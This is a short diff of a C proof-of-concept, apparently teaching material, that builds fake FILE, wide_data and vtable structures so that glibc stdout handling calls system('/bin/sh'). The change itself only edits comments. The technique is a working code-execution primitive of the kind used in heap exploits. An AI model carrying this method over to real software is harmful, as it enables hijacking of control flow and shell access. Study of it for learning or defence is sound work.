@@ -13,9 +13,9 @@ int main() {
     char *wide_data = calloc(0x200, 1);
     char *wide_vtable = calloc(0x200, 1);
 
-    *(size_t *)(stdout2) = (size_t) 0x68732f6e69622f; // /bin/sh
+    *(size_t *)(stdout2) = (size_t) 0x68732f6e69622f; // /bin/sh\x00
     *(size_t *)(wide_data + 0x20) = (size_t) 0x1;
-    *(size_t *)(stdout2 + 0xd8) = (size_t) _IO_wfile_jumps_addr + 0x40 - 0x30 ; // offset
+    *(size_t *)(stdout2 + 0xd8) = (size_t) _IO_wfile_jumps_addr + 0x40 - 0x30 ; // offset of seekof
     *(size_t *)(stdout2 + 0xa0) = (size_t) wide_data;
     *(size_t *)(wide_data + 0xe0) = (size_t) wide_vtable;
     *(size_t *)(wide_vtable + 0x18) = (size_t) &system;
